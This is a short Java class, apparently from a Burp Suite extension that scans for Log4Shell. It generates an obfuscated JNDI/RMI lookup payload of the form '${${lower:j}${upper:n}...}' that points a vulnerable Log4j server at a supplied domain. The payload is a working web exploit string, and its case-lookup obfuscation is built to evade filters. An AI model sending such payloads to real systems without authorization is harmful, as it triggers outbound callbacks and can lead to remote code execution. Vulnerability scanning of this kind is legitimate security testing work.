package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

public class POC8 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_RMI;
    }
}
